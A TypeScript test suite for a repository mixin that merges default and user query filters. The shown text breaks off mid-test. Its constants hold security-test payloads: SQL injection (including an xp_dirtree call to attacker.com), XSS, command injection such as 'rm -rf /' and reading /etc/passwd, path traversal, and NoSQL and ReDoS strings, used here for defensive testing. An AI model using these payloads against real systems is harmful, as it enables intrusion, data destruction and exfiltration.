/**
 * Default Filter Feature Test Suite
 *
 * Tests the default filter logic that:
 * 1. Allows models to define a default filter (e.g., { where: { isDeleted: false }, limit: 100 })
 * 2. Automatically applies the default filter to all queries
 * 3. Can be bypassed with `skipDefaultFilter: true` option
 * 4. Merges user filters with default filter (user takes precedence)
 *
 * Test Categories:
 * - Functional Tests (Happy Path): Standard expected behavior
 * - Where Condition Merging: Complex where clause combinations
 * - Boundary & Edge Cases: Null, undefined, empty, extreme values
 * - Security Tests: SQL injection, XSS, command injection, prototype pollution
 * - Type Handling: Type coercion and validation
 * - Integration Scenarios: Real-world usage patterns
 * - Performance & Stress Tests: Large payloads, circular references
 *
 * @module __tests__/default-filter
 */

import { describe, test, expect, beforeEach, spyOn } from 'bun:test';
import { FilterBuilder } from '@/base/repositories/operators';
import { DefaultFilterMixin } from '@/base/repositories/mixins';
import { TFilter } from '@/base/repositories/common';
import { BaseHelper } from '@venizia/ignis-helpers';
import { MetadataRegistry } from '@/helpers/inversion';

// Type alias for any filter (used in tests with dynamic types)
type AnyFilter = TFilter<any>;

// =============================================================================
// Test Setup - Create testable classes
// =============================================================================

/**
 * Mock entity for testing
 */
class MockEntity {
  name = 'TestEntity';
  schema = {} as any;
}

/**
 * Testable class that uses DefaultFilterMixin
 */
class TestableDefaultFilterRepository extends DefaultFilterMixin(BaseHelper) {
  private _entity: MockEntity;
  private _filterBuilder: FilterBuilder;

  constructor() {
    super({ scope: 'TestableDefaultFilterRepository' });
    this._entity = new MockEntity();
    this._filterBuilder = new FilterBuilder();
  }

  getEntity(): any {
    return this._entity;
  }

  get filterBuilder() {
    return this._filterBuilder;
  }
}

// =============================================================================
// Test Helpers & Security Payloads
// =============================================================================

/**
 * SQL injection payloads for security testing
 * These represent common attack vectors that should be safely handled
 */
const SQL_INJECTION_PAYLOADS = {
  basic: "'; DROP TABLE users; --",
  orAttack: "' OR '1'='1",
  unionSelect: "' UNION SELECT * FROM passwords --",
  commentAttack: '1; --',
  stackedQueries: "1'; DELETE FROM users; --",
  hexEncoded: '0x27',
  nullByte: 'test\x00DROP TABLE',
  blindInjection: "1' AND (SELECT COUNT(*) FROM users) > 0 --",
  timeBasedBlind: "1'; WAITFOR DELAY '0:0:5'; --",
  errorBased: "1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
  outOfBand: "1'; EXEC xp_dirtree '\\\\attacker.com\\share'; --",
  booleanBlind: "1' AND 1=1 --",
  secondOrder: "admin'--",
  truncation: 'a' + ' '.repeat(100) + 'DROP TABLE users',
} as const;

/**
 * XSS payloads for security testing
 */
const XSS_PAYLOADS = {
  scriptTag: '<script>alert("xss")</script>',
  eventHandler: '<img src=x onerror=alert(1)>',
  javascript: 'javascript:alert(1)',
  encodedScript: '&#60;script&#62;alert(1)&#60;/script&#62;',
  svgOnload: '<svg onload=alert(1)>',
  bodyOnload: '<body onload=alert(1)>',
  imgSrcError: '<img src=1 onerror=alert(1)>',
  inputOnfocus: '<input onfocus=alert(1) autofocus>',
  iframeSrcdoc: '<iframe srcdoc="<script>alert(1)</script>">',
  dataUri: 'data:text/html,<script>alert(1)</script>',
  base64Encoded: 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  polyglot:
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
} as const;

/**
 * Command injection payloads
 */
const COMMAND_INJECTION_PAYLOADS = {
  semicolon: '; rm -rf /',
  pipe: '| cat /etc/passwd',
  backtick: '`whoami`',
  dollar: '$(whoami)',
  ampersand: '& whoami',
  doubleAmpersand: '&& whoami',
  orOperator: '|| whoami',
  newline: '\n whoami',
  carriageReturn: '\r whoami',
  nullByteTermination: 'file.txt\x00; rm -rf /',
} as const;

/**
 * Path traversal payloads
 */
const PATH_TRAVERSAL_PAYLOADS = {
  basic: '../../../etc/passwd',
  doubleEncoded: '..%252f..%252f..%252fetc/passwd',
  nullByte: '../../../etc/passwd\x00.jpg',
  unicodeEncoded: '..%c0%af..%c0%af..%c0%afetc/passwd',
  backslash: '..\\..\\..\\etc\\passwd',
  mixedSlash: '..\\/../..\\/../etc/passwd',
} as const;

/**
 * NoSQL injection payloads (relevant for JSON-based filters)
 */
const NOSQL_INJECTION_PAYLOADS = {
  neOperator: { $ne: 1 },
  gtOperator: { $gt: '' },
  whereOperator: { $where: 'this.password == this.password' },
  regexDos: { $regex: '^(a+)+$', $options: 'i' },
  jsInjection: { $where: 'function() { return true; }' },
} as const;

/**
 * ReDoS (Regular Expression Denial of Service) payloads
 */
const REDOS_PAYLOADS = {
  exponentialBacktrack: 'a'.repeat(50) + '!',
  nestedQuantifiers: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  catastrophicBacktrack: 'x'.repeat(100) + 'y',
} as const;

/**
 * Unicode and encoding edge cases
 */
const UNICODE_EDGE_CASES = {
  nullChar: 'test\u0000value',
  bom: '\uFEFFtest',
  zeroWidth: 'test\u200Bvalue',
  rightToLeft: '\u202Etest',
  combining: 'te\u0301st',
  surrogates: '\uD800\uDC00',
  emoji: 'test\uD83D\uDE00value',
  fullWidthChars: '\uFF54\uFF45\uFF53\uFF54',
} as const;

// =============================================================================
// Test Suite: FilterBuilder.mergeFilter
// =============================================================================

describe('Default Filter Feature', () => {
  describe('FilterBuilder.mergeFilter', () => {
    let filterBuilder: FilterBuilder;

    beforeEach(() => {
      filterBuilder = new FilterBuilder();
    });

    // -------------------------------------------------------------------------
    // Functional Tests (Happy Path)
    // -------------------------------------------------------------------------

    describe('Functional Tests', () => {
      test('TC-001: should return empty object when both filters are undefined', () => {
        const result = filterBuilder.mergeFilter({
          defaultFilter: undefined,
          userFilter: undefined,
        });
        expect(result).toEqual({});
      });

      test('TC-002: should return default filter when user filter is undefined', () => {
        const defaultFilter = {
          where: { isDeleted: false },
          limit: 100,
        };
        const result = filterBuilder.mergeFilter({
          defaultFilter,
          userFilter: undefined,
        });
        expect(result).toEqual({
          where: { isDeleted: false },
          limit: 100,
        });
      });

      test('TC-003: should return user filter when default filter is undefined', () => {
        const userFilter = {
          where: { status: 'active' },
          limit: 10,
        };
        const result = filterBuilder.mergeFilter({
          defaultFilter: undefined,
          userFilter,
        });
        expect(result).toEqual({
          where: { status: 'active' },
          limit: 10,
        });
      });

      test('TC-004: should merge where conditions from both filters', () => {
        const defaultFilter: AnyFilter = {
          where: { isDeleted: false },
        };
        const userFilter: AnyFilter = {
          where: { status: 'active' },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          isDeleted: false,
          status: 'active',
        });
      });

      test('TC-005: should use user limit over default limit', () => {
        const defaultFilter = { limit: 100 };
        const userFilter = { limit: 10 };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.limit).toBe(10);
      });

      test('TC-006: should use user offset over default offset', () => {
        const defaultFilter = { offset: 0 };
        const userFilter = { offset: 50 };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.offset).toBe(50);
      });

      test('TC-007: should use user skip over default skip', () => {
        const defaultFilter = { skip: 0 };
        const userFilter = { skip: 25 };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.skip).toBe(25);
      });

      test('TC-008: should use user order over default order', () => {
        const defaultFilter = { order: ['createdAt DESC'] };
        const userFilter = { order: ['name ASC'] };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.order).toEqual(['name ASC']);
      });

      test('TC-009: should use user fields over default fields', () => {
        const defaultFilter = { fields: { id: true, name: true } };
        const userFilter = { fields: { id: true, email: true } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.fields).toEqual({ id: true, email: true });
      });

      test('TC-010: should use user include over default include', () => {
        const defaultFilter = { include: [{ relation: 'posts' }] };
        const userFilter = { include: [{ relation: 'comments' }] };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.include).toEqual([{ relation: 'comments' }]);
      });

      test('TC-011: should preserve default values when user does not specify them', () => {
        const defaultFilter: AnyFilter = {
          where: { isDeleted: false },
          limit: 100,
          order: ['createdAt DESC'],
          offset: 0,
        };
        const userFilter: AnyFilter = {
          where: { status: 'active' },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result).toEqual({
          where: { isDeleted: false, status: 'active' },
          limit: 100,
          order: ['createdAt DESC'],
          offset: 0,
        });
      });

      test('TC-074: should handle single condition default filter', () => {
        const defaultFilter: AnyFilter = { where: { tenantId: 'tenant-1' } };
        const userFilter: AnyFilter = {};
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({ tenantId: 'tenant-1' });
      });

      test('TC-075: should handle default filter with only limit', () => {
        const defaultFilter: AnyFilter = { limit: 50 };
        const userFilter: AnyFilter = { where: { active: true } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.limit).toBe(50);
        expect(result.where).toEqual({ active: true });
      });

      test('TC-076: should handle default filter with only order', () => {
        const defaultFilter: AnyFilter = { order: ['id ASC'] };
        const userFilter: AnyFilter = { limit: 20 };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.order).toEqual(['id ASC']);
        expect(result.limit).toBe(20);
      });
    });

    // -------------------------------------------------------------------------
    // Where Condition Merging Tests
    // -------------------------------------------------------------------------

    describe('Where Condition Merging', () => {
      test('TC-012: user where value should override default where value for same key', () => {
        const defaultFilter: AnyFilter = {
          where: { status: 'pending', isDeleted: false },
        };
        const userFilter: AnyFilter = {
          where: { status: 'active' },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          status: 'active', // User overrides
          isDeleted: false, // Default preserved
        });
      });

      test('TC-013: should handle nested where objects', () => {
        const defaultFilter: AnyFilter = {
          where: {
            metadata: { type: 'default' },
            isDeleted: false,
          },
        };
        const userFilter: AnyFilter = {
          where: {
            metadata: { type: 'user', priority: 'high' },
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          metadata: { type: 'user', priority: 'high' },
          isDeleted: false,
        });
      });

      test('TC-014: should handle and/or logical operators in where', () => {
        const defaultFilter: AnyFilter = {
          where: { isDeleted: false },
        };
        const userFilter: AnyFilter = {
          where: {
            or: [{ status: 'active' }, { status: 'pending' }],
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          isDeleted: false,
          or: [{ status: 'active' }, { status: 'pending' }],
        });
      });

      test('TC-015: should merge complex nested and/or conditions', () => {
        const defaultFilter: AnyFilter = {
          where: {
            and: [{ isDeleted: false }, { isArchived: false }],
          },
        };
        const userFilter: AnyFilter = {
          where: {
            or: [{ status: 'active' }, { priority: 'high' }],
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          and: [{ isDeleted: false }, { isArchived: false }],
          or: [{ status: 'active' }, { priority: 'high' }],
        });
      });

      test('TC-016: should handle operator objects in where conditions', () => {
        const defaultFilter = {
          where: { createdAt: { gte: '2024-01-01' } },
        };
        const userFilter = {
          where: { createdAt: { lte: '2024-12-31' } },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        // Deep merge should combine operators
        expect(result.where?.createdAt).toEqual({
          gte: '2024-01-01',
          lte: '2024-12-31',
        });
      });

      test('TC-077: should handle multiple AND conditions', () => {
        const defaultFilter: AnyFilter = {
          where: {
            and: [{ isActive: true }, { isVerified: true }],
          },
        };
        const userFilter: AnyFilter = {
          where: {
            and: [{ type: 'premium' }],
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        // Deep merge combines user's AND with default AND - first element merges, rest preserved
        expect(result.where?.and).toEqual([
          { type: 'premium', isActive: true },
          { isVerified: true },
        ]);
      });

      test('TC-078: should handle multiple OR conditions', () => {
        const defaultFilter: AnyFilter = {
          where: {
            or: [{ role: 'admin' }, { role: 'moderator' }],
          },
        };
        const userFilter: AnyFilter = {
          where: { status: 'active' },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          or: [{ role: 'admin' }, { role: 'moderator' }],
          status: 'active',
        });
      });

      test('TC-079: should handle nested AND within OR', () => {
        const defaultFilter: AnyFilter = {
          where: { isDeleted: false },
        };
        const userFilter: AnyFilter = {
          where: {
            or: [
              { and: [{ status: 'active' }, { type: 'user' }] },
              { and: [{ status: 'pending' }, { type: 'admin' }] },
            ],
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          isDeleted: false,
          or: [
            { and: [{ status: 'active' }, { type: 'user' }] },
            { and: [{ status: 'pending' }, { type: 'admin' }] },
          ],
        });
      });

      test('TC-080: should handle deeply nested logical operators', () => {
        const defaultFilter: AnyFilter = {
          where: { tenantId: 'tenant-1' },
        };
        const userFilter: AnyFilter = {
          where: {
            and: [
              {
                or: [{ and: [{ a: 1 }, { b: 2 }] }, { and: [{ c: 3 }, { d: 4 }] }],
              },
              { e: 5 },
            ],
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.tenantId).toBe('tenant-1');
        expect(result.where?.and).toBeDefined();
      });

      test('TC-081: should handle comparison operators merge', () => {
        const defaultFilter: AnyFilter = {
          where: {
            age: { gte: 18 },
            score: { gt: 0 },
          },
        };
        const userFilter: AnyFilter = {
          where: {
            age: { lte: 65 },
            score: { lt: 100 },
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.age).toEqual({ gte: 18, lte: 65 });
        expect(result.where?.score).toEqual({ gt: 0, lt: 100 });
      });

      test('TC-082: should handle in/nin operators', () => {
        const defaultFilter: AnyFilter = {
          where: { status: { in: ['active', 'pending'] } },
        };
        const userFilter: AnyFilter = {
          where: { role: { nin: ['banned', 'suspended'] } },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.status).toEqual({ in: ['active', 'pending'] });
        expect(result.where?.role).toEqual({ nin: ['banned', 'suspended'] });
      });

      test('TC-083: should handle like/ilike operators', () => {
        const defaultFilter: AnyFilter = {
          where: { name: { like: '%test%' } },
        };
        const userFilter: AnyFilter = {
          where: { email: { ilike: '%@example.com' } },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.name).toEqual({ like: '%test%' });
        expect(result.where?.email).toEqual({ ilike: '%@example.com' });
      });

      test('TC-084: should handle between operator', () => {
        const defaultFilter: AnyFilter = {
          where: { price: { between: [10, 100] } },
        };
        const userFilter: AnyFilter = {
          where: { quantity: { between: [1, 50] } },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.price).toEqual({ between: [10, 100] });
        expect(result.where?.quantity).toEqual({ between: [1, 50] });
      });
    });

    // -------------------------------------------------------------------------
    // Boundary & Edge Cases
    // -------------------------------------------------------------------------

    describe('Boundary & Edge Cases', () => {
      test('TC-017: should handle empty where object', () => {
        const defaultFilter: AnyFilter = { where: {} };
        const userFilter: AnyFilter = { where: { status: 'active' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({ status: 'active' });
      });

      test('TC-018: should handle null values in where conditions', () => {
        const defaultFilter: AnyFilter = { where: { deletedAt: null } };
        const userFilter: AnyFilter = { where: { status: 'active' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where).toEqual({
          deletedAt: null,
          status: 'active',
        });
      });

      test('TC-019: should handle undefined values in where conditions', () => {
        const defaultFilter: AnyFilter = { where: { field1: 'value1', field2: undefined } };
        const userFilter: AnyFilter = { where: { field3: 'value3' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.field1).toBe('value1');
        expect(result.where?.field3).toBe('value3');
      });

      test('TC-020: should handle limit of 0 - user value takes precedence', () => {
        const defaultFilter = { limit: 100 };
        const userFilter = { limit: 0 };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        // Implementation correctly uses ?? which preserves 0 since it's not undefined/null
        // This is correct behavior - user explicitly set limit to 0
        expect(result.limit).toBe(0);
      });

      test('TC-021: should handle very large limit values', () => {
        const defaultFilter = { limit: 100 };
        const userFilter = { limit: Number.MAX_SAFE_INTEGER };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.limit).toBe(Number.MAX_SAFE_INTEGER);
      });

      test('TC-022: should handle negative offset (edge case)', () => {
        const defaultFilter = { offset: 0 };
        const userFilter = { offset: -10 };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.offset).toBe(-10); // Validation should happen elsewhere
      });

      test('TC-023: should handle empty string values in where', () => {
        const defaultFilter = { where: { name: 'default' } };
        const userFilter = { where: { name: '' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.name).toBe('');
      });

      test('TC-024: should handle boolean values in where', () => {
        const defaultFilter = { where: { isActive: true } };
        const userFilter = { where: { isActive: false } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.isActive).toBe(false);
      });

      test('TC-025: should handle array values in where', () => {
        const defaultFilter = { where: { tags: ['default'] } };
        const userFilter = { where: { tags: ['user', 'custom'] } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.tags).toEqual(['user', 'custom']);
      });

      test('TC-026: should handle Date objects in where', () => {
        const defaultDate = new Date('2024-01-01');
        const userDate = new Date('2024-06-01');
        const defaultFilter = { where: { createdAt: defaultDate } };
        const userFilter = { where: { createdAt: userDate } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.createdAt).toEqual(userDate);
      });

      test('TC-027: should handle empty order array', () => {
        const defaultFilter = { order: ['createdAt DESC'] };
        const userFilter = { order: [] };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        // Empty array should still override default
        expect(result.order).toEqual([]);
      });

      test('TC-028: should handle fields as array', () => {
        const defaultFilter = { fields: ['id', 'name'] };
        const userFilter = { fields: ['id', 'email', 'status'] };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.fields).toEqual(['id', 'email', 'status']);
      });

      test('TC-029: should handle Unicode characters in where values', () => {
        const defaultFilter = { where: { name: 'default' } };
        const userFilter = { where: { name: 'Test user' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.name).toBe('Test user');
      });

      test('TC-030: should handle emoji in where values', () => {
        const defaultFilter = { where: { status: 'default' } };
        const userFilter = { where: { status: 'active' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.status).toBe('active');
      });

      test('TC-031: should handle very long string values', () => {
        const longString = 'a'.repeat(10000);
        const defaultFilter = { where: { description: 'default' } };
        const userFilter = { where: { description: longString } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.description).toBe(longString);
        expect(result.where?.description?.length).toBe(10000);
      });

      test('TC-032: should handle deeply nested where objects', () => {
        const defaultFilter = {
          where: {
            level1: {
              level2: {
                level3: {
                  level4: {
                    level5: 'default',
                  },
                },
              },
            },
          },
        };
        const userFilter = {
          where: {
            level1: {
              level2: {
                level3: {
                  level4: {
                    level5: 'user',
                  },
                },
              },
            },
          },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.level1?.level2?.level3?.level4?.level5).toBe('user');
      });

      test('TC-085: should handle NaN values', () => {
        const defaultFilter: AnyFilter = { where: { value: 10 } };
        const userFilter: AnyFilter = { where: { value: NaN } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(Number.isNaN(result.where?.value)).toBe(true);
      });

      test('TC-086: should handle Infinity values', () => {
        const defaultFilter: AnyFilter = { where: { max: 100 } };
        const userFilter: AnyFilter = { where: { max: Infinity } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.max).toBe(Infinity);
      });

      test('TC-087: should handle negative Infinity values', () => {
        const defaultFilter: AnyFilter = { where: { min: 0 } };
        const userFilter: AnyFilter = { where: { min: -Infinity } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.min).toBe(-Infinity);
      });

      test('TC-088: should handle Symbol values (edge case)', () => {
        const sym = Symbol('test');
        const defaultFilter: AnyFilter = { where: { id: 1 } };
        const userFilter: AnyFilter = { where: { symbol: sym } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.symbol).toBe(sym);
      });

      test('TC-089: should handle BigInt values', () => {
        const bigIntValue = BigInt(9007199254740991);
        const defaultFilter: AnyFilter = { where: { bigId: 1 } };
        const userFilter: AnyFilter = { where: { bigId: bigIntValue } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.bigId).toBe(bigIntValue);
      });

      test('TC-090: should handle RegExp in where (edge case)', () => {
        const regex = /test/i;
        const defaultFilter: AnyFilter = { where: { pattern: 'default' } };
        const userFilter: AnyFilter = { where: { pattern: regex } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.pattern).toBe(regex);
      });

      test('TC-091: should handle function values (edge case)', () => {
        const fn = () => 'test';
        const defaultFilter: AnyFilter = { where: { callback: null } };
        const userFilter: AnyFilter = { where: { callback: fn } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.callback).toBe(fn);
      });

      test('TC-092: should handle mixed null and undefined in same filter', () => {
        const defaultFilter: AnyFilter = {
          where: { a: null, b: undefined, c: 'default' },
        };
        const userFilter: AnyFilter = {
          where: { a: 'user', b: null, d: undefined },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.a).toBe('user');
        expect(result.where?.b).toBe(null);
        expect(result.where?.c).toBe('default');
      });

      test('TC-093: should handle very deep nesting (10 levels)', () => {
        const createNested = (depth: number, value: any): any => {
          if (depth === 0) {
            return value;
          }
          return { nested: createNested(depth - 1, value) };
        };

        const defaultFilter: AnyFilter = { where: createNested(10, 'default') };
        const userFilter: AnyFilter = { where: createNested(10, 'user') };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

        let current: any = result.where;
        for (let i = 0; i < 10; i++) {
          current = current?.nested;
        }
        expect(current).toBe('user');
      });

      test('TC-094: should handle array with mixed types', () => {
        const defaultFilter: AnyFilter = {
          where: { items: [1, 'two', true, null] },
        };
        const userFilter: AnyFilter = {
          where: { items: ['a', 2, false, undefined] },
        };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        // undefined becomes null during merge process
        expect(result.where?.items).toEqual(['a', 2, false, null]);
      });

      test('TC-095: should handle sparse arrays', () => {
        const sparseArray = [1, , , 4]; // eslint-disable-line no-sparse-arrays
        const defaultFilter: AnyFilter = { where: { data: [1, 2, 3] } };
        const userFilter: AnyFilter = { where: { data: sparseArray } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.data?.length).toBe(4);
      });
    });

    // -------------------------------------------------------------------------
    // Security Tests
    // -------------------------------------------------------------------------

    describe('Security Tests', () => {
      // SQL Injection Tests
      describe('SQL Injection Prevention', () => {
        test('TC-033: should handle SQL injection in where key - DROP TABLE', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { [SQL_INJECTION_PAYLOADS.basic]: 'value' },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          // The merge should complete without executing SQL
          expect(result.where?.isDeleted).toBe(false);
          expect(result.where?.[SQL_INJECTION_PAYLOADS.basic]).toBe('value');
        });

        test('TC-034: should handle SQL injection in where value - OR attack', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { username: SQL_INJECTION_PAYLOADS.orAttack },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.username).toBe(SQL_INJECTION_PAYLOADS.orAttack);
          expect(result.where?.isDeleted).toBe(false);
        });

        test('TC-035: should handle SQL injection in where value - UNION SELECT', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { id: SQL_INJECTION_PAYLOADS.unionSelect },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.id).toBe(SQL_INJECTION_PAYLOADS.unionSelect);
        });

        test('TC-036: should handle SQL injection in order field', () => {
          const defaultFilter = { order: ['createdAt DESC'] };
          const userFilter = { order: ['name; DROP TABLE users; --'] };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.order).toEqual(['name; DROP TABLE users; --']);
        });

        test('TC-037: should handle SQL injection in limit (type coercion)', () => {
          const defaultFilter = { limit: 100 };
          const userFilter = { limit: '100; DROP TABLE users;' } as any;
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter }) as any;
          expect(result.limit).toBe('100; DROP TABLE users;');
        });

        test('TC-038: should handle null byte injection', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { name: SQL_INJECTION_PAYLOADS.nullByte },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.name).toBe(SQL_INJECTION_PAYLOADS.nullByte);
        });

        test('TC-096: should handle blind SQL injection payload', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { id: SQL_INJECTION_PAYLOADS.blindInjection },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.id).toBe(SQL_INJECTION_PAYLOADS.blindInjection);
          expect(result.where?.isDeleted).toBe(false);
        });

        test('TC-097: should handle time-based blind SQL injection', () => {
          const defaultFilter: AnyFilter = { where: { active: true } };
          const userFilter: AnyFilter = {
            where: { query: SQL_INJECTION_PAYLOADS.timeBasedBlind },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.query).toBe(SQL_INJECTION_PAYLOADS.timeBasedBlind);
        });

        test('TC-098: should handle error-based SQL injection', () => {
          const defaultFilter: AnyFilter = { where: { valid: true } };
          const userFilter: AnyFilter = {
            where: { data: SQL_INJECTION_PAYLOADS.errorBased },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.data).toBe(SQL_INJECTION_PAYLOADS.errorBased);
        });

        test('TC-099: should handle second-order SQL injection', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { username: SQL_INJECTION_PAYLOADS.secondOrder },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.username).toBe(SQL_INJECTION_PAYLOADS.secondOrder);
        });

        test('TC-100: should handle SQL truncation attack', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { input: SQL_INJECTION_PAYLOADS.truncation },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.input).toBe(SQL_INJECTION_PAYLOADS.truncation);
        });

        test('TC-101: should handle all SQL injection payloads in batch', () => {
          const defaultFilter: AnyFilter = { where: { base: 'secure' } };

          for (const [name, payload] of Object.entries(SQL_INJECTION_PAYLOADS)) {
            const userFilter: AnyFilter = { where: { [name]: payload } };
            const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

            expect(result.where?.base).toBe('secure');
            expect(result.where?.[name]).toBe(payload);
          }
        });
      });

      // XSS Prevention Tests
      describe('XSS Prevention', () => {
        test('TC-039: should handle XSS script tag in where value', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { content: XSS_PAYLOADS.scriptTag },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.content).toBe(XSS_PAYLOADS.scriptTag);
        });

        test('TC-040: should handle XSS event handler in where value', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { html: XSS_PAYLOADS.eventHandler },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.html).toBe(XSS_PAYLOADS.eventHandler);
        });

        test('TC-041: should handle XSS javascript protocol in where value', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { url: XSS_PAYLOADS.javascript },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.url).toBe(XSS_PAYLOADS.javascript);
        });

        test('TC-102: should handle SVG onload XSS', () => {
          const defaultFilter: AnyFilter = { where: { safe: true } };
          const userFilter: AnyFilter = {
            where: { svg: XSS_PAYLOADS.svgOnload },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.svg).toBe(XSS_PAYLOADS.svgOnload);
        });

        test('TC-103: should handle data URI XSS', () => {
          const defaultFilter: AnyFilter = { where: { validated: true } };
          const userFilter: AnyFilter = {
            where: { uri: XSS_PAYLOADS.dataUri },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.uri).toBe(XSS_PAYLOADS.dataUri);
        });

        test('TC-104: should handle XSS polyglot payload', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { payload: XSS_PAYLOADS.polyglot },
          };
